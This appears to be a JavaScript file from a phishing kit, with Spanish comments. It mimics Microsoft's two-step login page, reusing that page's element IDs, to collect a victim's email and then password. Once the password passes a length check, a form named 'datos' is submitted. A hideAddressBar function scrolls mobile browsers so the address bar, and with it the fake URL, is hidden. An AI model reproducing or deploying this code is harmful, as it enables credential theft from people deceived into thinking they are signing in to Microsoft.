var patron = /\w+([\.-]?\w+)*/;
function muestra_oculta(id){
    if (document.getElementById){ //se obtiene el id
    var el = document.getElementById(id); //se define la variable "el" igual a nuestro div
    el.style.display = (el.style.display == 'none') ? 'block' : 'none'; //damos un atributo display:none que oculta el div
    }}
window.addEventListener("load", function()
{    if(!window.pageYOffset)
    {   hideAddressBar(); }
    window.addEventListener("orientationchange", hideAddressBar);});
function cambiarboton() {
        //obteniendo el valor que se puso en campo text del formulario
        miCampoTexto = document.getElementById("i0116");    
        valueForm=miCampoTexto.value;
        var patron=/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,4})+$/;
        //la condición!
        if (valueForm.search(patron) == 0) {
        document.all['i0116'].style.display="none";
        document.all['text14'].style.display = "none";
        document.all['txtcoa'].style.display="block";
        document.all['i0117'].style.display="block";
   		 	document.all['txtini'].style.display="none";
        document.all['idBtn_Back'].style.display="block";
    		document.all['displayName'].style.display="block";
    		document.all['idSIButton9'].style.display="none";
    		document.all['idSIButton8'].style.display="block";
        document.getElementById('displayName').innerHTML=document.getElementById('i0116').value;
return;}
			document.all['text14'].style.display="block";}
      function text(){
        miCampoTexto2 = document.getElementById("i0117");    
        valueForm2=miCampoTexto2.value;
        if (valueForm2.length >=5 && patron.test(valueForm2)) {
            document.all['text16'].style.display="none";
            miCampoTexto = document.getElementById("i0116");         
            const idSIButton8 = document.getElementById('idSIButton8');
            const send = document.getElementById('datos');
            send.addEventListener("click",function () {
            datos.submit();        });      
// codigo cuando esta vacio 
 		return;}   
    		document.all['text16'].style.display="block";}
function atras() {
            document.all['i0116'].style.display="block";
            document.all['i0116'].value="";
            document.all['i0117'].style.display="none";
            document.all['txtini'].style.display="block";
            document.all['txtcoa'].style.display="none";
            document.all['idSIButton9'].style.display="block";
            document.all['idSIButton8'].style.display="none";
            document.all['idBtn_Back'].style.display="none";
            document.all['displayName'].style.display="none";
            document.all['text14'].style.display="none";}
function hideAddressBar()
{  if(!window.location.hash)
  {  if(document.height < window.outerHeight + 10)
      {    document.body.style.height = (window.outerHeight + 50) + 'px';      }
      setTimeout(function()
      {   window.scrollTo(0, 1);     }, 50);  }}